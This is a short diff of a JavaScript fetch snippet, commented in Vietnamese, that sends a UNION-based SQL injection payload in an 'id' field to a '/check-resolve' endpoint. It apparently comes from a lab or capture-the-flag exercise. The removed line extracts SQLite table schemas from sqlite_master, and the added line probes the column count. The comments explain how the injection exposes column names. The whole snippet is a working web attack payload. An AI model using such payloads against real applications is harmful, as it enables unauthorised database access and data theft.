@@ -2,7 +2,7 @@ let formData = new URLSearchParams();
 
 // Dùng -1 để dòng đầu tiên bị rỗng, nhường chỗ cho kết quả UNION của chúng ta in ra
 // sql là cột chứa câu lệnh CREATE TABLE trong SQLite, nó sẽ lộ hết tên cột!
-formData.append('id', '-1 UNION SELECT sql FROM sqlite_master');
+formData.append('id', '-1 UNION SELECT 1, 2, 3, 4, 5, 6');
 
 fetch('/check-resolve', {
     method: 'POST',
